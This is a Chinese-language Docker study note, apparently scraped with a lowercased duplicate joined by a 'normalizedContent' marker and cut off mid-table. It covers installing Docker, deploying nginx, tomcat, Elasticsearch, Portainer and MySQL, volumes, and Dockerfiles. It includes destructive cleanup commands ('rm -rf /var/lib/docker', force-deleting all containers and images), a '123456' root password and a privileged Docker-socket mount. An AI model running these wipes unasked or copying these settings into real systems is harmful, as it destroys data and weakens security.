    Block until one or more containers stop, then print their exit codes\n\n\n\n\n\n\n\n\n\n# 作业练习\n\n# 部署Nginx\n\n\n\n# 官网搜索nginx，可以看到帮助文档\n\n# 下载镜像\n[root@192 home]# docker pull nginx\nUsing default tag: latest\nlatest: Pulling from library/nginx\n8559a31e96f4: Pull complete \n8d69e59170f7: Pull complete \n3f9f1ec1d262: Pull complete \nd1f5ff4f210d: Pull complete \n1e22bfa8652e: Pull complete \nDigest: sha256:21f32f6c08406306d822a0e6e8b7dc81f53f336570e852e25fbe1e3e3d0d0133\nStatus: Downloaded newer image for nginx:latest\ndocker.io/library/nginx:latest\n\n# 查看镜像\n[root@192 home]# docker images\nREPOSITORY          TAG                 IMAGE ID            CREATED             SIZE\ncentos              latest              831691599b88        13 hours ago        215MB\nnginx               latest              2622e6cca7eb        7 days ago          132MB\n\n# 运行测试\n# -d 后台运行，--name 命名，-p 暴露端口，3344服务器、宿主机的端口，容器内部端口\n[root@192 home]# docker run -d --name nginx01 -p:3344:80 nginx\n38dbf7bdcaef232d269b7184d91e44e06087181b5ee929494e177ad526810fa8\n[root@192 home]# docker ps\nCONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                  NAMES\n38dbf7bdcaef        nginx               "/docker-entrypoint.…"   7 seconds ago       Up 6 seconds        0.0.0.0:3344->80/tcp   nginx01\n\n# 使用3344可以访问成功\n[root@192 home]# curl localhost:3344\n<!DOCTYPE html>\n<html>\n<head>\n<title>Welcome to nginx!</title>\n<style>\n    body {\n        width: 35em;\n        margin: 0 auto;\n        font-family: Tahoma, Verdana, Arial, sans-serif;\n    }\n</style>\n</head>\n<body>\n<h1>Welcome to nginx!</h1>\n<p>If you see this page, the nginx web server is successfully installed and\nworking. Further configuration is required.</p>\n\n<p>For online documentation and support please refer to\n<a href="http://nginx.org/">nginx.org</a>.<br/>\nCommercial support is available at\n<a href="http://nginx.com/">nginx.com</a>.</p>\n\n<p><em>Thank you for using nginx.</em></p>\n</body>\n</html>\n\n\n\n端口暴露\n\n\n\n可以公网访问\n\n找到服务器地址\n\n\n\n浏览器输入 192.168.147.132:3344/\n\n\n\n[root@192 home]# docker ps\nCONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                  NAMES\n38dbf7bdcaef        nginx               "/docker-entrypoint.…"   21 minutes ago      Up 21 minutes       0.0.0.0:3344->80/tcp   nginx01\n\n# 进入容器\n[root@192 home]# docker exec -it nginx01 /bin/bash\n\n# 查一下nginx在哪\nroot@38dbf7bdcaef:/# whereis nginx\nnginx: /usr/sbin/nginx /usr/lib/nginx /etc/nginx /usr/share/nginx\n\n# 到这个目录\nroot@38dbf7bdcaef:/# cd /etc/nginx\nroot@38dbf7bdcaef:/etc/nginx# ls\nconf.d\t\tkoi-utf  mime.types  nginx.conf   uwsgi_params\nfastcgi_params\tkoi-win  modules     scgi_params  win-utf\n\n# 退出\nroot@38dbf7bdcaef:/etc/nginx# exit\nexit\n\n# 停止\n[root@192 home]# docker stop 38dbf7bdcaef\n38dbf7bdcaef\n\n\n\n\n再次刷新网页，服务关闭\n\n思考问题：每次改动nginx配置文件，都需要进入容器内部，十分麻烦，要是可以在容器外部提供一个映射路径，达到在容器修改文件名，容器内部就可以自动修改？-v 数据卷技术！\n\n# 部署tomcat\n\n\n\n在docker hub上查看版本号和使用方法\n\n\n\n官方文档一定要翻烂，超多版本，我的天呐~\n\n# 官方方法\n\ndocker run -it --rm tomcat:9.0\n\n# docker run 可以不用pull，能自动下载\n# -it 直接进去运行\n# --rm 是什么意思？入门的意思？\n# 我们之前的启动都是后台，停止了容器之后，容器还是可以查到\n# 写了--rm，类似阅后即焚模式，用完即删除，这种通常用来测试\n\n# 最后冒号查好的版本号\n\n\n\n\n\n\nctrl+c退出\n\ndocker ps -a\n\n\n\n\n可以看到并没有tomcat，印证阅后即焚模式，容器会删除，镜像不会删除\n\n平时不建议这样搞\n\n# 正常方法\n\ndocker pull tomcat:9.0 # 之前下过了，应该不用下了，这里老师讲错了\n\n\n\n\n# 启动运行，应该加上版本号\ndocker run -d -p 3355:8080 --name tomcat01 tomcat\n\n\n\n\n# 进入容器\ndocker exec -it tomcat01 /bin/bash\n\n\n\n\n发现问题\n\n 1. linux命令少了\n 2. 没有webapps\n\n\n\n这是阿里云镜像的原因：默认使用最小镜像，所有不必要的都剔除了，保证最小可运行环境\n\n\n\n再次找到结构\n\n\n\n在浏览器中输入：http://192.168.147.132:3355/\n\n\n\n思考问题：我们以后部署项目，如果每次都要进入容器是不是身份麻烦？我要是可以在容器外部提供一个映射路径，webapps，我们在外部放置项目，就自动同步到内部就好了！\n\ndocker容器 tomcat+网站\n\ndocker mysql\n\n# 部署es+kibana\n\n\n\n# es 暴露的端口很多\n# es 十分耗内存\n# es 的数据一般需要放置到安全目录！挂载\n\n# 启动 elasticsearch\n$ docker run -d --name elasticsearch01 -p 9200:9200 -p 9300:9300 -e "discovery.type=single-node" elasticsearch:7.6.2\n\n# 查看内存占用情况\ndocker stats\n\n\n\n\n# 先感觉stop一下\ndocker stop ba18713ca536\n\n\n\n\n# 通过 -e 限制内存\n$ docker run -d --name elasticsearch02 -p 9200:9200 -p 9300:9300 -e "discovery.type=single-node" -e ES_JAVA_OPTS=“-Xms64m -Xmx512m” elasticsearch:7.6.2\n\n\n\n\n没成功啊，SEI能告诉我为啥！！\n\ndocker run -d --name elasticsearch02 -p 9200:9200 -p 9300:9300 -e "discovery.type=single-node" -e ES_JAVA_OPTS="-Xms64m -Xmx512m" elasticsearch:7.6.2\n\n\n> py0003null大佬: “ES_JAVA_OPTS=-Xms64m -Xmx512m”\n> \n> py0003null大佬: 引号提前试试\n\n原因是引号！！你没觉得怪怪的嘛\n\n\n\n此时查看stats，发现内存占用在控制范围内\n\n\n\nctrl + C退出，记得stop\n\n\n\n# 思考：用kibana链接elasticsearch\n\n\n\n\n# 可视化\n\n * portainer(先用这个)\n * Rancher(CI/CD时用)\n\n# portainer\n\nDocker图像化界面管理工具，提供一个后台面板供我们操作！\n\ndocker run -d -p 8088:9000 --restart=always -v /var/run/docker.sock:/var/run/docker --privileged=true portainer/portainer\n\n\n\n\n访问外网8088\n\n\n\n用户名\n\n密码\n\n\n\n【中午吃饭重连了一下，失败，不知道发生了啥】\n\n\n\n\n\n【平时不会用这个，好吧，先往下】\n\n\n#\n\n\n# Docker镜像\n\n\n# 原理\n\nUnionFS 联合文件系统\n\n\n\nbootfs：boot file system\n\nrootfs：root file system\n\n\n\n\n\n\n\n\n\nDocker镜像都是只读的，当容器启动时，一个新的可写层被加到镜像的顶部，这一层就是我们通常说的容器层，容器层之下的都叫镜像层\n\n\n\n\n# commit提交镜像\n\ndocker commit # 提交容器成为一个新的副本\ndocker commit -m="提交的描述信息" -a="作者" 容器id 目标镜像名：[TAG]\n\n\ndocker images\ndocker run -it -p 8080:8080 tomcat\n\n\n\n\n这是一个前台程序\n\n\n\n将webapps.dist里面所有的文件拷贝到webapps里面，其中-r必须有，表示目录递归拷贝\n\n\n\n\n\ndocker commit -a="paidaxing" -m="add webapps app" 当前容器的id tomcat02:1.0\n\n\n\n\n发现新的版本，比之前的大了一些，因为里面记录了我们的改动\n\n> 如果想保存当前容器的状态，可以通过commit提交，获得一个镜像\n> \n> 好比我们以前学习VM的时候的快照\n> \n> 到这里算是入门了\n> \n> 接下来三个部分是docker的精髓\n\n\n# 容器数据卷\n\n\n# 什么是容器卷\n\ndocker是要将应用和环境打包成一个镜像\n\n这样，数据就不应该在容器中，否则容器删除，数据就会丢失，这就是删库跑路\n\n故容器之间要有一个数据共享技术\n\n在Docker容器中产生的数据，同步到本地，这就是卷技术\n\n本质上是一个目录挂载，将容器内的目录挂载到虚拟机上\n\n\n\n目的：容器的持久化和同步操作\n\n容器间可以数据共享\n\n\n# 使用数据卷\n\n方式一：直接使用命令来挂载\n\ndocker run -it -v -p\n# -it 交互式进入\n# -v volume卷技术\n# -p 主机端口\n\n\n\n\n新开一个窗口\n\ndocker inspect 容器id\n\n\n\n\n找到挂载信息Mounts\n\n\n\n测试\n\n\n\n容器停止后，修改主机文件，再启动容器的时候，数据同样改变\n\n双向同步\n\n\n# 实战安装mysql\n\nMySQL的数据持久化命令\n\ndocker search mysql\n\n# 拉取\ndocker pull mysql:5.7\n\n# 挂载\ndocker run -d -p 3310:3306 -v /home/mysql/conf:/etc/mysql/conf.d -v /home/mysql/data:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 --name mysql01 mysql5.7\n\n-d 后台运行\n-p 端口映射\n-v 卷挂载\n-e 环境配置 安装启动mysql需要配置密码\n--name 容器名字\n\n\n\n\n\n链接测试：打开SQLyog\n\n\n\n点 测试链接\n\n\n\n点 链接\n\n\n\n\n# 具名和匿名挂载\n\n\n\n\n\n\n#\n\nDockerFile使用来构建docker镜像的文件\n\n\n\n> kas: 没有安装吧？\n> \n> kas: 安装一下就可以了\n> \n> py9001021曾叙坚: centos 默认使用vi写内容，vim需要下载\n> \n> py9001021曾叙坚: 是的，需要下载vim才能使用\n> \n> YF: 配置可以改下，字体就很炫酷了\n> \n> 都建民: 用vi 试试\n> \n> 都建民: 你没有安装vim\n> \n> 都建民: yum install vim\n> \n> 都建民: 试试这个命令\n\nyum install vim # 编辑文件的，没有装一下\n\n\n\n\n安装完之后就可以运行这个命令了\n\n\n\n# 镜像是一层一层的，脚本是一行一行的\n# 指令都是大写的\n# 这里的每个命令可以理解为镜像的一层\n\nFROM centos\n\nVOLUME ["volume01","volume02"] # 再创建镜像的时候就挂载出来\n\nCMD echo "---end---"\nCMD /bin/bash\n\n\n\n\n\n想保存并退出\n\n> Wesley.: shift 加 冒号\n\n\n\ncat dockerfile1\n\ndocker build -f dockerfile1 -t padaxing/centos:1.0 .  # 最后的点很重要 镜像名不能有/\n\n\n\n\ndocker images\n\n\n\n\n启动生成的镜像\n\n\n\n在容器内部创建一个文件\n\n\n\n查看Mounts，Source对应容器外目录，匿名挂载卷\n\n\n\n测试一下，在container volume01下生成文件\n\n\n\n在主机挂载路径下，也同样生成\n\n\n# 多个容器数据共享\n\n\n\n看一下有啥images\n\n\n\n启动docker01，用之前建的padaxing/centos 1.0 镜像\n\ndocker run -it --name docker01 padaxing/centos:1.0 # 1.0必须写\n\n\n\n\n当前这个ctrl+p+q不停止退出\n\n\n\n依次启动docker02、docker03\n\ndocker run -it --name docker02 --volumes-from docker01 padaxing/centos:1.0\n\n\ndocker02继承docker01的volumes\n\n可以验证，在docker01下加一个数据，在docker02下也会出现\n\n\n\n创建docker03，同样继承docker01\n\ndocker run -it --name docker03 --volumes-from docker01 padaxing/centos:1.0\n\n\n\n\n在docker03的volume01下建立文件，在docker01的volume01下同样也有\n\n即通过--volumes-from 可以实现不同容器间的数据共享\n\n删除docker01，数据还在\n\ndocker rm -f \n\n\n\n\n可以看到，删除docker01，进入docker02，数据依然在\n\n结论：\n\n容器之间配置信息的传递，数据卷容器的生命周期一直持续到没有容器使用位置\n\n但是如果持久化到了本地，即使所有容器删除了，本地数据是不会删除的\n\n----------------------------------------\n\n\n# DockerFile\n\n是用来构建docker镜像的文件，可以理解为命令参数脚本\n\n构建步骤：\n\n 1. 编写一个dockerfile文件\n 2. docker build 构建成为一个镜像\n 3. docker run运行镜像\n 4. docker push 发布镜像（DockerHub、阿里云镜像仓库 私有/共有）\n\n这个写一个项目时一样的\n\n\n# 官方DockerFile示例\n\n看一下官方的DockerFile\n\n\n\n可以看到官方镜像都是基础包，很多功能没有，我们通常会自己搭建自己的镜像\n\n官方既然可以制作镜像，我们亦可以\n\n----------------------------------------\n\n\n# DockerFile基础知识\n\n 1. 每个指令都必须是大写字母\n 2. 按照从上到下顺序执行\n 3. *#*表示注释\n 4. 每一个指令都会创建体检一个新的镜像层，并提交\n\n\n\ndocker是面向开发的，我们以后要发布项目，做镜像，就要编写dockerfile文件，这个文件十分简单！\n\nDocker镜像逐渐成为企业的交付标准，必须掌握！\n\n----------------------------------------\n\n\n# DockerFile命令\n\n\n\n\n#\n\nFROM # 基础镜像 比如centos\nMAINTAINER # 镜像是谁写的 姓名+邮箱\nRUN # 镜像构建时需要运行的命令\nADD # 添加，比如添加一个tomcat压缩包\nWORKDIR # 镜像的工作目录\nVOLUME # 挂载的目录\nEXPOSE # 指定暴露端口，跟-p一个道理\nRUN # 最终要运行的\nCMD # 指定这个容器启动的时候要运行的命令，只有最后一个会生效，而且可被替代\nENTRYPOINT # 指定这个容器启动的时候要运行的命令，可以追加命令\nONBUILD # 当构建一个被继承Dockerfile 这个时候运行ONBUILD指定，触发指令\nCOPY # 将文件拷贝到镜像中\nENV # 构建的时候设置环境变量\n\n\n\n# 实战构建自己的centos\n\nDocker Hub中99%的镜像都是从FROM scratch开始的\n\n添加centos7的压缩包\n\n# 创建一个自己的centos\n\n# 进入home目录\ncd /home\n\n# 创建一个目录，之后的东西都保存到这里\nmkdir dockerfile\n# 进入这个目录\ncd dockerfile/\n# 创建一个dockerfile，名字叫mydockerfile\nvim mydockerfile-centos\n\n\n\n\nxbash新开一个界面\n\n# 官方默认centos\ndocker run -it centos\npwd # 官方默认有pwd命令\nvim # 官方默认没有vim命令\nifconfig # 官方默认没有ifconfig命令\n\n\n\n\n回到mydockerfile\n\n\n\n# 下面给官方centos加上自定义的内容\nFROM centos\nMAINTAINER padaxing<010301200@hai.com>\n\nENV MYPATH /usr/local\nWORKDIR $MYPATH\n\nRUN yum -y install vim\nRUN yum -y install net-tools\n\nEXPOSE 80\n\nCMD echo $MYPATH\nCMD echo "---end---"\nCMD /bin/bash\n\n\n\n\nESC, shif + : 输入wq保存并退出\n\n如果写错了需要修改、\n\nvim mydockerfile-centos\n# 进入之后按i或者INSERT键即可修改\n\n\n下面通过这个这个文件创建镜像\n\ndocker build -f dockerfile-centos -t mycentos:0.1 .\n\n\n\n\n依次执行命令\n\n\n\n最终返回Successfully表示成功\n\n\n\ndocker run -it mycentos:0.1 # 版本号必须写，不然他会去找最新的\npwd\nvim\nifconfig\n\n\n\n\n这时可以看到这些功能都有了\n\n可以通过查看docker构建历史\n\n\n\n可以看到当前这个镜像是怎么一步一步构建起来的\n\n我们平时拿到一个镜像也可以通过这个方法研究一下他是怎么做的\n\n\n# CMD与ENTRYPOINT\n\n\nFROM centos\nCMD ["ls","-a"] # 启动centos展示目录\n\n\n\n\n测试ENTRYPOINT\n\n\n\nrun的时候可以直接加命令\n\n\n\nDocker中许多命令都十分相似，我们需要了解他们的区别，最好的方式就是这样对比测试\n\n----------------------------------------',normalizedContent:'# docker\n\n\n\n\n# 参考资料\n\n官方文档：https://docs.docker.com/docker-for-windows/\n\n【官方文档超级详细】\n\n仓库地址：https://hub.docker.com/\n\n【发布到仓库，git pull push】\n\nb站教程：https://www.bilibili.com/video/bv1og4y1q7m4?\n\n【这个教程非常简洁！且深入！基于企业应用场景！推荐！以下笔记都基于该课程】\n\n\n# 前期基础\n\nlinux基本命令，类似cd，mkdir等\n\n\n# docker概述\n\n\n# docker为什么会出现\n\n一款产品，开发和上线两套环境，应用环境配置费时费力，而且容易出问题\n\n尤其对于机器学习和深度学习的库更是如此，很可能存在版本问题、底层依赖冲突问题\n\n所以发布项目时，不只是一套代码过去，而是代码+环境整体打包过去\n\n所谓开发即运维，保证系统稳定性，提高部署效率\n\n使用docker后的流程：\n\n开发：建立模型--环境--打包带上环境，即镜像--放到docker仓库\n\n部署：下载docker中的镜像，直接运行即可\n\ndocker的思想来自于集装箱，集装箱，对环境进行隔离\n\ndocker通过隔离机制，可以将服务器利用到极致。\n\n\n# docker的历史\n\n2010年，几个搞it的人，在美国成立一家公司dotcloud\n\n做一些pass的云计算服务\n\n他们将自己的容器化技术命名为docker\n\ndocker基于go语言开发\n\ndocker刚刚诞生的时候，没有引起行业的注意，dotcloud活不下去\n\n然后他们决定开源\n\n2013年，创始人将docker开源，不开则以，一开惊人，刚开源的时候，每个月都会更新一个版本\n\n2014年4月9日，docker 1.0发布\n\n\n# 容器vs虚拟机\n\n在容器技术出来之前，用的是虚拟机技术\n\n# 虚拟机原理示意图\n\n\n\n缺点：\n\n 1. 资源占用多\n 2. 冗余步骤多\n 3. 启动很慢\n\n# 容器化技术示意图\n\n不是模拟的完整的操作系统\n\n\n\n# 二者对比\n\n比较虚拟机和docker的不同\n\n       传统虚拟机           docker\n虚拟内容   硬件+完整的操作系统+软件   app+lib\n大小     笨重，通常几个g        轻便几个m或kb\n启动速度   慢，分钟级           快，秒级\n                       \n\n\n# docker安装\n\n\n# docker的基本组成\n\n\n\n明确几个概念：\n\n 1. 镜像(image)：docker镜像好比一个模板，可以通过这个模板来创建容器(container)，一个镜像可以创建多个容器，类似python中的class\n\n 2. 容器(container)：类似python中通过class创建的实例，object；容器可以理解为一个简易的系统\n\n 3. 仓库(repository)：存放镜像的地方，\n    \n    分为共有仓库和私有仓库\n    \n    * docker hub：国外的\n    \n    * 阿里云：配置镜像加速\n\n\n# 环境准备\n\n我们要有一台服务器，并且可以操作它\n\n 1. linux命令基础，购买linux阿里云的服务器\n 2. centos 7\n 3. 使用xbash链接远程服务器\n\n\n# 安装xbash\n\n下载centos7 https://www.jianshu.com/p/a63f47e096e8\n\n下载vmware 360软件管家下载\n\nvmware配置虚拟机 https://blog.csdn.net/babyxue/article/details/80970526\n\nxbash链接服务器 https://blog.csdn.net/zzy1078689276/article/details/77280814\n\n[root@192 ~]# cd /\n[root@192 /]# pwd\n/\n[root@192 /]# ls\nbin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var\n[root@192 /]# uname -r\n3.10.0-1127.el7.x86_64\n\n\n\n\n用户名\n\n密码\n\n查看ip：vmware里面输入，ip addipr\n\n\n# centos安装\n\nhttps://docs.docker.com/engine/install/centos/\n\n\n# 卸载旧的版本\n\n# 卸载旧的版本\n$ sudo yum remove docker \\\n                  docker-client \\\n                  docker-client-latest \\\n                  docker-common \\\n                  docker-latest \\\n                  docker-latest-logrotate \\\n                  docker-logrotate \\\n                  docker-engine\n\n\n\n\n\n\n# 安装基本环境\n\n# 安装基本的安装包\n$ sudo yum install -y yum-utils\n\n\n!\n\n\n\n\n# 设置镜像的仓库\n\n注意！！下载默认用国外的，太慢不要用！\n\n用国内镜像，百度搜索，docker的阿里云镜像地址\n\n# 不要用官网默认这个！\n$ sudo yum-config-manager \\\n    --add-repo \\\n    https://download.docker.com/linux/centos/docker-ce.repo # 默认是国外的\n\n# 换成下面的\n\n$ sudo yum-config-manager \\\n    --add-repo \\\n    https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo # 阿里云镜像\n\n\n\n\n直接复制粘贴就ok了\n\n更像软件包索引\n\nyum makecache fast\n\n\n\n\n没有问题的话就是可以用的\n\n\n# 安装docker引擎\n\nyum install docker-ce docker-ce-cli containerd.io # docker-ce 社区版 ee 企业版\n\n\n注意这里会有几个个y/n的判断\n\n\n\n\n\n要看到complet再收手！\n\n\n# 启动docker\n\nsystemctl start docker # 代表启动成功\n\n\ndocker version\n\n\nclient: docker engine - community\n version:           19.03.11\n api version:       1.40\n go version:        go1.13.10\n git commit:        42e35e61f3\n built:             mon jun  1 09:13:48 2020\n os/arch:           linux/amd64\n experimental:      false\n\nserver: docker engine - community\n engine:\n  version:          19.03.11\n  api version:      1.40 (minimum version 1.12)\n  go version:       go1.13.10\n  git commit:       42e35e61f3\n  built:            mon jun  1 09:12:26 2020\n  os/arch:          linux/amd64\n  experimental:     false\n containerd:\n  version:          1.2.13\n  gitcommit:        7ad184331fa3e55e52b890ea95e65ba581ae3429\n runc:\n  version:          1.0.0-rc10\n  gitcommit:        dc9208a3303feef5b3839f4323d9beb36df0a9dd\n docker-init:\n  version:          0.18.0\n  gitcommit:        fec3683\n\n\n\ndocker run hello-world\n\n\n\n\n中间一堆是签名信息\n\nrun的运行流程图\n\n\n\n查看下载的镜像\n\ndocker images\n\n\n\n\n\n# 卸载docker\n\n# 卸载依赖\nyum remove docker-ce docker-ce-cli containerd.io\n\n# 删除资源\nrm -rf /var/lib/docker # docker 的默认工作路径\n\n\n\n\n# 阿里云镜像加速\n\n支付宝扫码登录，短信验证，确认授权\n\n我有两个问题\n\n 1. 阿里云镜像加速必须配置嘛？\n    \n    > 哎呦我去: 加速快\n    > \n    > 哎呦我去: 要是翻墙就无所谓了\n\n 2. 这个阿里云必须要买嘛，买哪个，我看阿里云好多产品\n    \n    > 哎呦我去:不需要买\n    > \n    > 哎呦我去:免费的\n    > \n    > 哎呦我去:阿里云搜索容器服务\n    > \n    > 哎呦我去:有一个镜像加速\n\n 3. 这个地址是哪来的呀\n\n操作\n\n\n\n\n\n控制台搜索 容器镜像服务\n\n\n\n找到加速地址\n\n\n\nsudo mkdir -p /etc/docker # 创建一个陌路\nsudo tee /etc/docker/daemon.json <<-\'eof\'\n{\n  "registry-mirrors": ["https://uyfgafsw.mirror.aliyuncs.com"]\n}\neof # 编写配置文件\n\nsudo systemctl daemon-reload # 重启服务\nsudo systemctl restart docker # 重启docker\n\n\n\n\n在线画图软件processon\n\n服务器及购买相关介绍\n\n\n# 底层原理\n\ndocker是真么工作的？\n\ndocker是一个client-server结构的系统，docker的守护进程在主机上。通过socket从客户端访问！\n\ndockerserver接受到docker-client的指令，\n\n\n\ndocker为什么比vm快？\n\n 1. docker有着比虚拟机更少的抽象层\n 2. docker主要用的是宿主机的内核，vm需要guest os\n\n\n\n所以说新建一个容器的时候，docker不需要像虚拟机一样重新加载一个操作系统内核，避免引导\n\n\n# docker命令\n\n\n# 帮助命令\n\ndocker version # 显示docker的基本信息\ndocker info # 系统信息，镜像和容器的数量\ndocker 命令 --help # 全部信息\n\n\n官网文档\n\n\n\n\n# 镜像命令\n\n# docker images\n\n查看所有本地主机上的镜像\n\n[root@192 ~]# docker images\n\n\n\n\n\n# 解释\nrepository  # 镜像仓库源\ntag                 # 镜像的标签\nimage id           # 镜像的id\ncreated           # 镜像的创建时间\nsize # 镜像的大小\n\n\n--all , -a\t\tshow all images (default hides intermediate images) # 显示所有\n--digests\t\tshow digests\n--filter , -f\t\tfilter output based on conditions provided\n--format\t\tpretty-print images using a go template\n--no-trunc\t\tdon’t truncate output\n--quiet , -q\t\tonly show numeric ids # 只显示id\n\n\n\n\n# docker search\n\n搜索仓库中的镜像，相当于网页搜索\n\n网页搜索\n\n\n\nmysql\n\n\n\ndocker search mysql\n\n\n\n\ndocker search --help\n\n\n\n\n# 解释\noptions:\n  -f, --filter filter   filter output based on conditions provided\n      --format string   pretty-print search using a go template\n      --limit int       max number of search results (default 25)\n      --no-trunc        don\'t truncate output\n\n\n\ndocker search mysql --filter=stars=3000 # 搜索出stars大于3000的\n\n\n\n\n# docker pull\n\n下载镜像\n\ndocker pull mysql # 下载mysql镜像，default tag，默认最新版latest\n\n\n[root@192 ~]# sudo systemctl daemon-reload\n[root@192 ~]# sudo systemctl restart docker\n[root@192 ~]# docker pull mysql\nusing default tag: latest # 不写tag默认最新版\nlatest: pulling from library/mysql\n8559a31e96f4: pull complete  # layer 分层下载，docker image的核心 联合文件系统\nd51ce1c2e575: pull complete \nc2344adc4858: pull complete \nfcf3ceff18fc: pull complete \n16da0c38dc5b: pull complete \nb905d1797e97: pull complete \n4b50d1c6b05c: pull complete \nc75914a65ca2: pull complete \n1ae8042bdd09: pull complete \n453ac13c00a3: pull complete \n9e680cd72f08: pull complete \na6b5dc864b6c: pull complete \ndigest: sha256:8b7b328a7ff6de46ef96bcf83af048cb00a1c86282bfca0cb119c84568b4caf6#签名\nstatus: downloaded newer image for mysql:latest\ndocker.io/library/mysql:latest # 真实地址\n\n# 即\ndocker pull mysql\n# 等价于\ndocker pull docker.io/library/mysql:latest\n\n\n\n\n# 指定版本下载 \ndocker pull mysql:5.7\n\n\n版本来自于官网，版本库https://hub.docker.com/_/mysql\n\n\n\n\n\ndocker images\n\n\n此时查看镜像，可以看到新下载的两个\n\n\n\n# docker rmi\n\nremove images\n\n# 删除一个 可以通过名称 也可以指定id -f表示删除所有\ndocker rmi -f 9cfcce23593a\n# 删除多个 用空格分隔id\ndocker rmi -f id id id\n# 删除所有 \ndocker rmi -f $(docker images -aq) # images -aq就是查所有镜像id，从而递归删除\n\n\n\n\n\n\n\n# 容器命令\n\n说明：有了镜像才能创建容器，linux，下载一个centos镜像来测试学习\n\ndocker pull centos\n\n\n\n\n# 新建容器并启动\n\ndocker run [可选参数] image\n\n# 参数说明\n--name=“name” # 容器名字，用于区分容器\n-d 后台方式运行\n-it 使用交互方式运行，进入容器查看内容\n-p 指定容器的端口 如-p 8080::8080\n\t-p ip:主机端口：容器端口\n\t-p 主机端口:容器端口\n\t-p 容器端口\n\t\n-p 随机指定端口\n\n\n# 进入退出容器\n\n# 进入\ndocker run -it centos /bin/bash \n# 查看目录\nls\n# 退出\nexit\n\n\n\n\n注意这里面主机名，编程了centos的id\n\n这里面就是一个容器，套娃啊\n\n# 查看运行的容器\n\n# 查看正在运行的容器\ndocker ps\n# 查看曾经运行的容器\ndocker ps -a\n# 显示最近创建的容器，设置显示个数\ndocker ps -a - n=? \n# 只显示容器的编号\ndocker ps -aq\n\n\n[root@192 ~]# docker ps\ncontainer id        image               command             created             status              ports               names\n[root@192 ~]# docker ps -a\ncontainer id        image               command             created             status                     ports               names\n9939864fa2e6        centos              "bin/bash"          4 minutes ago       exited (0) 4 minutes ago                       unruffled_knuth\n5f42e9930435        centos              "/bin/bash"         8 minutes ago       exited (0) 4 minutes ago                       lucid_cannon\na89ddb393d3d        bf756fb1ae65        "/hello"            19 hours ago        exited (0) 19 hours ago                        gracious_bhabha\n[root@192 ~]# docker ps -a -n=2\ncontainer id        image               command             created             status                     ports               names\n9939864fa2e6        centos              "bin/bash"          6 minutes ago       exited (0) 6 minutes ago                       unruffled_knuth\n5f42e9930435        centos              "/bin/bash"         10 minutes ago      exited (0) 7 minutes ago \n[root@192 ~]# docker ps -aq\n9939864fa2e6\n5f42e9930435\na89ddb393d3d\n\n\n\n# 退出容器\n\n# 容器停止退出\nexit\n# 容器不停止退出 注意必须在英文输入法下，中文输入法不行\nctrl + p + q\n\n\n[root@192 ~]# docker run -it centos /bin/bash\n[root@bfcea13c40cd /]# [root@192 ~]# docker ps ##注意这里会自动给个命令，删掉\ncontainer id        image               command             created              status              ports               names\nbfcea13c40cd        centos              "/bin/bash"         about a minute ago   up about a minute                       stoic_wilson\nedbd9366d959        centos              "/bin/bash"         7 minutes ago        up 7 minutes                            affectionate_bartik\n[root@192 ~]# docker exec -it edbd9366d959 /bin/bash ## 再次进入\n[root@edbd9366d959 /]# exit ##停止并推出\nexit\n\n\n\n# 删除容器\n\n# 删除指定容器 不能删除正在运行的容器，如果强制删除 rm -f\ndocker rm 容器id\n# 删除所有容器\ndocker rm -f $(docker ps -aq)\n# 删除所有容器\ndocker ps -a -q|xargs docker rm\n\n\n[root@192 ~]# docker ps -a\ncontainer id        image               command             created             status                      ports               names\nbfcea13c40cd        centos              "/bin/bash"         29 minutes ago      up 29 minutes                                   stoic_wilson\nedbd9366d959        centos              "/bin/bash"         35 minutes ago      up 35 minutes                                   affectionate_bartik\n9939864fa2e6        centos              "bin/bash"          48 minutes ago      exited (0) 48 minutes ago                       unruffled_knuth\n5f42e9930435        centos              "/bin/bash"         52 minutes ago      exited (0) 49 minutes ago                       lucid_cannon\na89ddb393d3d        bf756fb1ae65        "/hello"            20 hours ago        exited (0) 20 hours ago                         gracious_bhabha\n[root@192 ~]# docker rm 5f42e9930435\n5f42e9930435\n[root@192 ~]# docker rm edbd9366d959      # 注意正在运行的容器不能删除\nerror response from daemon: you cannot remove a running container edbd9366d9596c744dd449119269b04de2f2a494e7fc471f6396bcefd94c33fe. stop the container before attempting removal or force remove\n\n\n\n[root@192 ~]# docker ps -aq # 所有容器id\nbfcea13c40cd\nedbd9366d959\n9939864fa2e6\na89ddb393d3d\n[root@192 ~]# docker rm -f $(docker ps -aq) # 全部删除\nbfcea13c40cd\nedbd9366d959\n9939864fa2e6\na89ddb393d3d\n\n\n\n# 启动和停止容器的操作\n\ndocker start\ndocker restart\ndocker stop\ndocker kill\n\n\n[root@192 ~]# docker run -it centos /bin/bash\n[root@7b1a7dd10ea4 /]# exit\nexit\n[root@192 ~]# docker ps #查看正在运行的\ncontainer id        image               command             created             status              ports               names\n[root@192 ~]# docker ps -a # 查看历史运行过的\ncontainer id        image               command             created             status                      ports               names\n7b1a7dd10ea4        centos              "/bin/bash"         54 seconds ago      exited (0) 42 seconds ago                       fervent_mirzakhani\n[root@192 ~]# docker start 7b1a7dd10ea4 # 启动当前这个容器 container id 粘过 来\n7b1a7dd10ea4\n[root@192 ~]# docker ps # 查看当前运行容器 发现启动成功\ncontainer id        image               command             created             status              ports               names\n7b1a7dd10ea4        centos              "/bin/bash"         2 minutes ago       up 28 seconds                           fervent_mirzakhani\n[root@192 ~]# docker stop 7b1a7dd10ea4 # 停止运行\n7b1a7dd10ea4\n[root@192 ~]# docker ps # 再次查看 没有这个容器了\ncontainer id        image               command             created             status              ports               names\n\n\n\n\n\n# 常用其他命令\n\n# 后台启动docker\n\ndocker run -d 镜像名\n# 用docker ps 查看的时候 发现停止了\n\n# 后台运行，docker发现前台没有，容器启动后，发现自己没有提供服务，会立刻停止\n\n\nlast login: wed jun 17 19:47:35 2020\n[root@192 ~]# systemctl start docker # 关机后重启了，需要启动docker\n[root@192 ~]# docker run -d centos # 运行\n8ce188e5fee31c2fac93c0a405ee1a95c38dbc50cb47c35b19c0039c27558ded\n[root@192 ~]# docker ps -a # 查看正在运行的\ncontainer id        image               command             created             status                      ports               names\n8ce188e5fee3        centos              "/bin/bash"         19 seconds ago      exited (0) 18 seconds ago                       tender_dirac\n7b1a7dd10ea4        centos              "/bin/bash"         8 hours ago     